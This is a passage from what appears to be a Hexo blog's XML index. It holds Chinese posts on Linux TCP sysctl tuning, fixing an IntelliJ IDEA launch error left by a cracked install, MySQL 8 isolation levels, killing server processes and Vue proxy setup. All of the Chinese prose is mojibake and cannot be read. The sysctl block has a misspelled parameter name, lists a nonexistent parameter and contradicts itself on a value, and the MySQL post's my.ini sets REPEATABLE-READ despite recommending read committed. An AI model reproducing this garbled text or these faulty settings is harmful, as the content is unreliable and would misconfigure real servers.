class="line">net.ipv4.tcp_fin_timeout = 30</span><br></pre></td></tr></table></figure><p>è®©å†…æ ¸å‚æ•°ç”Ÿæ•ˆï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><p>ç»è¿‡è¿™æ ·çš„è°ƒæ•´ä¹‹åï¼Œé™¤äº†ä¼šè¿›ä¸€æ­¥æå‡æœåŠ¡å™¨çš„è´Ÿè½½èƒ½åŠ›ä¹‹å¤–ï¼Œè¿˜èƒ½å¤Ÿé˜²å¾¡å°æµé‡ç¨‹åº¦çš„DoSã€CCå’ŒSYNæ”»å‡»ã€‚</p><p>æ­¤å¤–ï¼Œå¦‚æœè¿æ¥æ•°æœ¬èº«å°±å¾ˆå¤šï¼Œè¿˜å¯ä»¥å†ä¼˜åŒ–ä¸€ä¸‹TCPçš„å¯ä½¿ç”¨ç«¯å£èŒƒå›´ï¼Œè¿›ä¸€æ­¥æå‡æœåŠ¡å™¨çš„å¹¶å‘èƒ½åŠ›ã€‚ä¾ç„¶æ˜¯å¾€ä¸Šé¢çš„å‚æ•°æ–‡ä»¶ä¸­ï¼ŒåŠ å…¥ä¸‹é¢è¿™äº›é…ç½®ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿™å‡ ä¸ªå‚æ•°ï¼Œå»ºè®®åªåœ¨æµé‡éå¸¸å¤§çš„æœåŠ¡å™¨ä¸Šå¼€å¯ï¼Œä¼šæœ‰æ˜¾è‘—çš„æ•ˆæœã€‚ä¸€èˆ¬çš„æµé‡å°çš„æœåŠ¡å™¨ä¸Šï¼Œæ²¡æœ‰å¿…è¦å»è®¾ç½®è¿™å‡ ä¸ªå‚æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¡¨ç¤ºå½“keepaliveèµ·ç”¨çš„æ—¶å€™ï¼ŒTCPå‘é€keepaliveæ¶ˆæ¯çš„é¢‘åº¦ã€‚ç¼ºçœæ˜¯2å°æ—¶ï¼Œæ”¹ä¸º20åˆ†é’Ÿã€‚</span></span><br><span class="line">net.ipv4.tcp_keepalive_time = 1200</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¡¨ç¤ºç”¨äºå‘å¤–è¿æ¥çš„ç«¯å£èŒƒå›´ã€‚ç¼ºçœæƒ…å†µä¸‹å¾ˆå°ï¼š32768åˆ°61000ï¼Œæ”¹ä¸º10000åˆ°65000ã€‚ï¼ˆæ³¨æ„ï¼šè¿™é‡Œä¸è¦å°†æœ€ä½å€¼è®¾çš„å¤ªä½ï¼Œå¦åˆ™å¯èƒ½ä¼šå ç”¨æ‰æ­£å¸¸çš„ç«¯å£ï¼ï¼‰</span></span><br><span class="line">net.ipv4.ip_local_port_range = 10000 65000</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¡¨ç¤ºSYNé˜Ÿåˆ—çš„é•¿åº¦ï¼Œé»˜è®¤ä¸º1024ï¼ŒåŠ å¤§é˜Ÿåˆ—é•¿åº¦ä¸º8192ï¼Œå¯ä»¥å®¹çº³æ›´å¤šç­‰å¾…è¿æ¥çš„ç½‘ç»œè¿æ¥æ•°ã€‚</span></span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 8192</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¡¨ç¤ºç³»ç»ŸåŒæ—¶ä¿æŒTIME_WAITçš„æœ€å¤§æ•°é‡ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼ŒTIME_WAITå°†ç«‹åˆ»è¢«æ¸…é™¤å¹¶æ‰“å°è­¦å‘Šä¿¡æ¯ã€‚é»˜ è®¤ä¸º180000ï¼Œæ”¹ä¸º6000ã€‚å¯¹äºApacheã€Nginxç­‰æœåŠ¡å™¨ï¼Œä¸Šå‡ è¡Œçš„å‚æ•°å¯ä»¥å¾ˆå¥½åœ°å‡å°‘TIME_WAITå¥—æ¥å­—æ•°é‡ï¼Œä½†æ˜¯å¯¹äºSquidï¼Œæ•ˆæœå´ä¸å¤§ã€‚æ­¤é¡¹å‚æ•°å¯ä»¥æ§åˆ¶TIME_WAITçš„æœ€å¤§æ•°é‡ï¼Œé¿å…SquidæœåŠ¡å™¨è¢«å¤§é‡çš„TIME_WAITæ‹–æ­»ã€‚</span></span><br><span class="line">net.ipv4.tcp_max_tw_buckets = 5000</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–TCPå‚æ•°è¯´æ˜"><a href="#å…¶ä»–TCPå‚æ•°è¯´æ˜" class="headerlink" title="å…¶ä»–TCPå‚æ•°è¯´æ˜"></a>å…¶ä»–TCPå‚æ•°è¯´æ˜</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®°å½•çš„é‚£äº›å°šæœªæ”¶åˆ°å®¢æˆ·ç«¯ç¡®è®¤ä¿¡æ¯çš„è¿æ¥è¯·æ±‚çš„æœ€å¤§å€¼ã€‚å¯¹äºæœ‰128Må†…å­˜çš„ç³»ç»Ÿè€Œè¨€ï¼Œç¼ºçœå€¼æ˜¯1024ï¼Œå°å†…å­˜çš„ç³»ç»Ÿåˆ™æ˜¯128ã€‚</span></span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 65536</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯ä¸ªç½‘ç»œæ¥å£æ¥æ”¶æ•°æ®åŒ…çš„é€Ÿç‡æ¯”å†…æ ¸å¤„ç†è¿™äº›åŒ…çš„é€Ÿç‡å¿«æ—¶ï¼Œå…è®¸é€åˆ°é˜Ÿåˆ—çš„æ•°æ®åŒ…çš„æœ€å¤§æ•°ç›®ã€‚</span></span><br><span class="line">net.core.netdev_max_backlog = 32768</span><br><span class="line"></span><br><span class="line"><span class="comment"># webåº”ç”¨ä¸­listenå‡½æ•°çš„backlogé»˜è®¤ä¼šç»™æˆ‘ä»¬å†…æ ¸å‚æ•°çš„net.core.somaxconné™åˆ¶åˆ°128ï¼Œè€Œnginxå®šä¹‰çš„NGX_LISTEN_BACKLOGé»˜è®¤ä¸º511ï¼Œæ‰€ä»¥æœ‰å¿…è¦è°ƒæ•´è¿™ä¸ªå€¼ã€‚</span></span><br><span class="line">net.core.somaxconn = 32768</span><br><span class="line"></span><br><span class="line">net.core.wmem_default = 8388608</span><br><span class="line"></span><br><span class="line">net.core.rmem_default = 8388608</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ€å¤§socketè¯»buffer,å¯å‚è€ƒçš„ä¼˜åŒ–å€¼:873200</span></span><br><span class="line">net.core.rmem_max = 16777216</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ€å¤§socketå†™buffer,å¯å‚è€ƒçš„ä¼˜åŒ–å€¼:873200</span></span><br><span class="line">net.core.wmem_max = 16777216</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¶é—´æˆ³å¯ä»¥é¿å…åºåˆ—å·çš„å·ç»•ã€‚ä¸€ä¸ª1Gbpsçš„é“¾è·¯è‚¯å®šä¼šé‡åˆ°ä»¥å‰ç”¨è¿‡çš„åºåˆ—å·ã€‚æ—¶é—´æˆ³èƒ½å¤Ÿè®©å†…æ ¸æ¥å—è¿™ç§â€œå¼‚å¸¸â€çš„æ•°æ®åŒ…ã€‚è¿™é‡Œéœ€è¦å°†å…¶å…³æ‰ã€‚</span></span><br><span class="line">net.ipv4.tcp_timestsmps = 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºäº†æ‰“å¼€å¯¹ç«¯çš„è¿æ¥ï¼Œå†…æ ¸éœ€è¦å‘é€ä¸€ä¸ªSYNå¹¶é™„å¸¦ä¸€ä¸ªå›åº”å‰é¢ä¸€ä¸ªSYNçš„ACKã€‚ä¹Ÿå°±æ˜¯æ‰€è°“ä¸‰æ¬¡æ¡æ‰‹ä¸­çš„ç¬¬äºŒæ¬¡æ¡æ‰‹ã€‚è¿™ä¸ªè®¾ç½®å†³å®šäº†å†…æ ¸æ”¾å¼ƒè¿æ¥ä¹‹å‰å‘é€SYN+ACKåŒ…çš„æ•°é‡ã€‚</span></span><br><span class="line">net.ipv4.tcp_synack_retries = 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å†…æ ¸æ”¾å¼ƒå»ºç«‹è¿æ¥ä¹‹å‰å‘é€SYNåŒ…çš„æ•°é‡ã€‚</span></span><br><span class="line">net.ipv4.tcp_syn_retries = 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å¯é‡ç”¨ã€‚å…è®¸å°†TIME-WAIT socketsé‡æ–°ç”¨äºæ–°çš„TCPè¿æ¥ã€‚</span></span><br><span class="line"><span class="comment">#net.ipv4.tcp_tw_len = 1</span></span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCPå†™buffer,å¯å‚è€ƒçš„ä¼˜åŒ–å€¼: 8192 436600 873200</span></span><br><span class="line">net.ipv4.tcp_wmem = 8192 436600 873200</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCPè¯»buffer,å¯å‚è€ƒçš„ä¼˜åŒ–å€¼: 32768 436600 873200</span></span><br><span class="line">net.ipv4.tcp_rmem  = 32768 436600 873200</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ ·æœ‰3ä¸ªå€¼,æ„æ€æ˜¯:</span></span><br><span class="line"><span class="comment"># net.ipv4.tcp_mem[0]:ä½äºæ­¤å€¼ï¼ŒTCPæ²¡æœ‰å†…å­˜å‹åŠ›ã€‚</span></span><br><span class="line"><span class="comment"># net.ipv4.tcp_mem[1]:åœ¨æ­¤å€¼ä¸‹ï¼Œè¿›å…¥å†…å­˜å‹åŠ›é˜¶æ®µã€‚</span></span><br><span class="line"><span class="comment"># net.ipv4.tcp_mem[2]:é«˜äºæ­¤å€¼ï¼ŒTCPæ‹’ç»åˆ†é…socketã€‚</span></span><br><span class="line"><span class="comment"># ä¸Šè¿°å†…å­˜å•ä½æ˜¯é¡µï¼Œè€Œä¸æ˜¯å­—èŠ‚ã€‚å¯å‚è€ƒçš„ä¼˜åŒ–å€¼æ˜¯:786432 1048576 1572864</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç³»ç»Ÿä¸­æœ€å¤šæœ‰å¤šå°‘ä¸ªTCPå¥—æ¥å­—ä¸è¢«å…³è”åˆ°ä»»ä½•ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶å¥æŸ„ä¸Šã€‚</span></span><br><span class="line"><span class="comment"># å¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œè¿æ¥å°†å³åˆ»è¢«å¤ä½å¹¶æ‰“å°å‡ºè­¦å‘Šä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªé™åˆ¶ä»…ä»…æ˜¯ä¸ºäº†é˜²æ­¢ç®€å•çš„DoSæ”»å‡»ï¼Œä¸èƒ½è¿‡åˆ†ä¾é å®ƒæˆ–è€…äººä¸ºåœ°å‡å°è¿™ä¸ªå€¼ï¼Œ</span></span><br><span class="line">net.ipv4.tcp_max_orphans = 3276800</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´åº”è¯¥å¢åŠ è¿™ä¸ªå€¼(å¦‚æœå¢åŠ äº†å†…å­˜ä¹‹å)ã€‚</span></span><br><span class="line"><span class="comment"># å¦‚æœå¥—æ¥å­—ç”±æœ¬ç«¯è¦æ±‚å…³é—­ï¼Œè¿™ä¸ªå‚æ•°å†³å®šäº†å®ƒä¿æŒåœ¨FIN-WAIT-2çŠ¶æ€çš„æ—¶é—´ã€‚å¯¹ç«¯å¯ä»¥å‡ºé”™å¹¶æ°¸è¿œä¸å…³é—­è¿æ¥ï¼Œç”šè‡³æ„å¤–å½“æœºã€‚ç¼ºçœå€¼æ˜¯60ç§’ã€‚2.2 å†…æ ¸çš„é€šå¸¸å€¼æ˜¯180ç§’ï¼Œå¯ä»¥æŒ‰è¿™ä¸ªè®¾ç½®ï¼Œä½†è¦è®°ä½çš„æ˜¯ï¼Œå³ä½¿æœºå™¨æ˜¯ä¸€ä¸ªè½»è½½çš„WEBæœåŠ¡å™¨ï¼Œä¹Ÿæœ‰å› ä¸ºå¤§é‡çš„æ­»å¥—æ¥å­—è€Œå†…å­˜æº¢å‡ºçš„é£é™©ï¼ŒFIN- WAIT-2çš„å±é™©æ€§æ¯”FIN-WAIT-1è¦å°ï¼Œå› ä¸ºå®ƒæœ€å¤šåªèƒ½åƒæ‰1.5Kå†…å­˜ï¼Œä½†æ˜¯å®ƒä»¬çš„ç”Ÿå­˜æœŸé•¿äº›ã€‚</span></span><br><span class="line">net.ipv4.tcp_fin_timeout = 30</span><br><span class="line"></span><br><span class="line"><span class="comment">#TCPå¿«é€Ÿæ‰“å¼€ï¼ˆTCP Fast Openï¼ŒTFOï¼‰æ˜¯å¯¹TCPçš„ä¸€ç§ç®€åŒ–æ¡æ‰‹æ‰‹ç»­çš„æ‹“å±•ï¼Œç”¨äºæé«˜ä¸¤ç«¯ç‚¹é—´è¿æ¥çš„æ‰“å¼€é€Ÿåº¦</span></span><br><span class="line">net.ipv4.tcp_fastopen = 3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»è¿‡è¿™æ ·çš„ä¼˜åŒ–é…ç½®ä¹‹åï¼ŒæœåŠ¡å™¨çš„TCPå¹¶å‘å¤„ç†èƒ½åŠ›ä¼šæ˜¾è‘—æé«˜ã€‚ä»¥ä¸Šé…ç½®ä»…ä¾›å‚è€ƒï¼Œç”¨äºç”Ÿäº§ç¯å¢ƒè¯·æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µã€‚</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEAæ— æ³•æ­£å¸¸å¯åŠ¨</title>
      <link href="post/35800/"/>
      <url>post/35800/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä»¥å‰éƒ½æ˜¯ç”¨çš„ç ´è§£ç‰ˆï¼Œä»Šå¤©æƒ³æ”¯æŒä¸€ä¸‹æ­£ç‰ˆï¼Œåˆ°å®˜ç½‘ä¸‹è½½äº†æœ€æ–°ç‰ˆçš„IDEAï¼Œå®‰è£…æˆåŠŸåå‘ç°æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œè®°å½•ä¸€ä¸‹æœ¬æ¬¡å‘ç°çš„å‘</p><span id="more"></span><h3 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h3><p>å°† <code>/Applications/IntelliJ IDEA.app/Contents/MacOS/idea</code> æ–‡ä»¶æ‹–åˆ°å‘½ä»¤è¡Œï¼Œè§‚å¯Ÿæ—¥å¿—è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error opening zip file or JAR manifest missing : /Applications/IntelliJ IDEA.app/Contents/lib/jetbrains-agent.jar</span><br><span class="line">Error occurred during initialization of VM</span><br><span class="line">agent library failed to init: instrument</span><br></pre></td></tr></table></figure><p>é€šè¿‡é”™è¯¯å¾—çŸ¥ï¼Œæ˜¯è¯¥libç›®å½•ä¸‹ç¼ºå°‘äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå®˜ç½‘ä¸‹è½½çš„åŒ…é‡Œæ˜¯æ²¡æœ‰åŒ…å«è¿™ä¸ªæ–‡ä»¶çš„æ‰€ä»¥æ— æ³•è¯»å–</p><h3 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h3><p>åº”è¯¥æ˜¯ä»¥å‰ä¸‹è½½çš„ç ´è§£ç‰ˆå¯¼è‡´çš„ï¼Œç ´è§£ç‰ˆé‡Œé¢åŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œå®˜ç½‘çš„ç‰ˆæœ¬è¦†ç›–åè¿™ä¸ªæ–‡ä»¶å°±ä¸å­˜åœ¨äº†</p><ul><li>æ‰¾åˆ° <code>/Library/Application Support/JetBrains</code> ç›®å½•</li><li>æ‰¾åˆ°å½“å‰ç‰ˆæœ¬çš„ç›®å½•ï¼Œæˆ‘çš„æ˜¯ <code>IntelliJIdea2020.2</code></li><li>æ‰“å¼€ <code>idea.vmoptions</code> æ–‡ä»¶ï¼Œåˆ é™¤æœ‰å…³ <code>jetbrains-agent.jar</code> æ–‡ä»¶çš„è¿™ä¸€æ¡</li></ul><p>é€šè¿‡ä»¥ä¸Šæ–¹æ³•è§£å†³åï¼Œå°±å¯ä»¥é¡ºåˆ©æ‰“å¼€è½¯ä»¶äº†ï¼Œå¦‚æœä¹‹å‰ä½¿ç”¨è¿‡ç ´è§£ç‰ˆå°±å¯èƒ½æœ‰æ­¤ç±»é—®é¢˜ï¼Œå¦‚æœä¸äº†è§£çš„è¯è¿˜æ˜¯ä¼šæµªè´¹å¾ˆå¤šæ—¶é—´çš„</p>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ç¯å¢ƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼€å‘ç¯å¢ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql8ä¿®æ”¹äº‹åŠ¡éš”ç¦»çº§åˆ«</title>
      <link href="post/63403/"/>
      <url>post/63403/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>çº¿ä¸Šä»£ç å‡ºç°äº†bugï¼Œç»æŸ¥æ˜¯mysqléš”ç¦»çº§åˆ«å¼•èµ·çš„é—®é¢˜ï¼Œå°†æ•°æ®åº“éš”ç¦»çº§åˆ«æ”¹ä¸ºæ›´é€‚åˆçº¿ä¸Šä¸šåŠ¡çš„è¯»æäº¤</p><span id="more"></span><h3 id="æŸ¥çœ‹äº‹åŠ¡éš”ç¦»çº§åˆ«"><a href="#æŸ¥çœ‹äº‹åŠ¡éš”ç¦»çº§åˆ«" class="headerlink" title="æŸ¥çœ‹äº‹åŠ¡éš”ç¦»çº§åˆ«"></a>æŸ¥çœ‹äº‹åŠ¡éš”ç¦»çº§åˆ«</h3><p>MySQL8ä¸­éš”ç¦»çº§åˆ«çš„å˜é‡è·Ÿä¹‹å‰çš„ç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œä¹‹å‰æ˜¯tx_isolationï¼ŒMySQL8æ”¹æˆäº†transaction_isolation</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;transaction%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@transaction_isolation;</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹äº‹åŠ¡éš”ç¦»çº§åˆ«"><a href="#ä¿®æ”¹äº‹åŠ¡éš”ç¦»çº§åˆ«" class="headerlink" title="ä¿®æ”¹äº‹åŠ¡éš”ç¦»çº§åˆ«"></a>ä¿®æ”¹äº‹åŠ¡éš”ç¦»çº§åˆ«</h3><p>ç”±ä½åˆ°é«˜åˆ†åˆ«ä¸º</p><ul><li>read uncommittedï¼ˆè¯»æœªæäº¤ï¼‰</li><li>read committedï¼ˆè¯»æäº¤ï¼‰</li><li>repeatable readï¼ˆé‡å¤è¯»ï¼‰</li><li>Serializableï¼ˆåºåˆ—åŒ–ï¼‰</li></ul><p>è®¾ç½®æœ¬æ¬¡ä¼šè¯çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œåªåœ¨æœ¬ä¼šè¯æœ‰æ•ˆï¼Œä¸ä¼šå½±å“åˆ°å…¶å®ƒä¼šè¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> session transaction isolation level <span class="built_in">read</span> committed;</span><br></pre></td></tr></table></figure><p>è®¾ç½®å…¨å±€çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œè¯¥è®¾ç½®ä¸ä¼šå½±å“å½“å‰å·²ç»è¿æ¥çš„ä¼šè¯ï¼Œæ–°æ‰“å¼€çš„ä¼šè¯ï¼Œå°†ä½¿ç”¨æ–°è®¾ç½®çš„äº‹åŠ¡éš”ç¦»çº§åˆ«</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global transaction isolation level <span class="built_in">read</span> committed;</span><br></pre></td></tr></table></figure><p>è®¾ç½®ä¸‹ä¸€æ¬¡äº‹åŠ¡æ“ä½œçš„éš”ç¦»çº§åˆ«ï¼Œè¯¥è®¾ç½®ä¼šéšç€ä¸‹ä¸€æ¬¡äº‹åŠ¡çš„æäº¤è€Œå¤±æ•ˆ</p><h3 id="é‡å¯åç»§ç»­ç”Ÿæ•ˆ"><a href="#é‡å¯åç»§ç»­ç”Ÿæ•ˆ" class="headerlink" title="é‡å¯åç»§ç»­ç”Ÿæ•ˆ"></a>é‡å¯åç»§ç»­ç”Ÿæ•ˆ</h3><p>ä¿®æ”¹my.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">transaction-isolation</span> = REPEATABLE-READ</span><br><span class="line"><span class="attr">transaction-read-only</span> = <span class="literal">OFF</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³é—­æ‰€æœ‰PHP Nginx Mysqlè¿›ç¨‹</title>
      <link href="post/40230/"/>
      <url>post/40230/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ‰æ—¶éœ€è¦å…³é—­ç¨‹åºçš„æ‰€æœ‰è¿›ç¨‹</p><span id="more"></span><h3 id="å…³é—­PHPè¿›ç¨‹"><a href="#å…³é—­PHPè¿›ç¨‹" class="headerlink" title="å…³é—­PHPè¿›ç¨‹"></a>å…³é—­PHPè¿›ç¨‹</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> $(ps aux | grep <span class="string">&#x27;[p]hp&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="å…³é—­Nginxè¿›ç¨‹"><a href="#å…³é—­Nginxè¿›ç¨‹" class="headerlink" title="å…³é—­Nginxè¿›ç¨‹"></a>å…³é—­Nginxè¿›ç¨‹</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> $(ps aux | grep <span class="string">&#x27;[n]ginx&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="å…³é—­Mysqlè¿›ç¨‹"><a href="#å…³é—­Mysqlè¿›ç¨‹" class="headerlink" title="å…³é—­Mysqlè¿›ç¨‹"></a>å…³é—­Mysqlè¿›ç¨‹</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> $(ps aux | grep <span class="string">&#x27;[m]ysql&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vueé…ç½®è·¨åŸŸä»£ç†</title>
      <link href="post/42883/"/>
      <url>post/42883/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å¦‚æœå‰ç«¯åº”ç”¨å’Œåç«¯ API æœåŠ¡å™¨æ²¡æœ‰è¿è¡Œåœ¨åŒä¸€ä¸ªä¸»æœºä¸Šï¼Œéœ€è¦åœ¨å¼€å‘ç¯å¢ƒä¸‹å°† API è¯·æ±‚ä»£ç†åˆ° API æœåŠ¡å™¨ã€‚è¿™ä¸ªé—®é¢˜å¯ä»¥é€šè¿‡ vue.config.js ä¸­çš„ devServer.proxy é€‰é¡¹æ¥é…ç½®ã€‚</p><span id="more"></span><h3 id="vue-config-js"><a href="#vue-config-js" class="headerlink" title="vue.config.js"></a>vue.config.js</h3><p><code>vue.config.js</code> æ˜¯ä¸€ä¸ªå¯é€‰çš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœé¡¹ç›®çš„ (å’Œ package.json åŒçº§çš„) æ ¹ç›®å½•ä¸­å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒä¼šè¢« @vue/cli-service è‡ªåŠ¨åŠ è½½ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ package.json ä¸­çš„ vue å­—æ®µï¼Œä½†æ˜¯æ³¨æ„è¿™ç§å†™æ³•éœ€è¦ä½ ä¸¥æ ¼éµç…§ JSON çš„æ ¼å¼æ¥å†™ã€‚</p><p>è¿™ä¸ªæ–‡ä»¶åº”è¯¥å¯¼å‡ºä¸€ä¸ªåŒ…å«äº†é€‰é¡¹çš„å¯¹è±¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// é€‰é¡¹...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="devServer-proxy"><a href="#devServer-proxy" class="headerlink" title="devServer.proxy"></a>devServer.proxy</h3><p>devServer.proxy å¯ä»¥æ˜¯ä¸€ä¸ªæŒ‡å‘å¼€å‘ç¯å¢ƒ API æœåŠ¡å™¨çš„å­—ç¬¦ä¸²ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: <span class="string">&#x27;http://localhost:4000&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¼šå‘Šè¯‰å¼€å‘æœåŠ¡å™¨å°†ä»»ä½•æœªçŸ¥è¯·æ±‚ (æ²¡æœ‰åŒ¹é…åˆ°é™æ€æ–‡ä»¶çš„è¯·æ±‚) ä»£ç†åˆ°<a href="http://localhost:4000ã€‚">http://localhost:4000ã€‚</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span 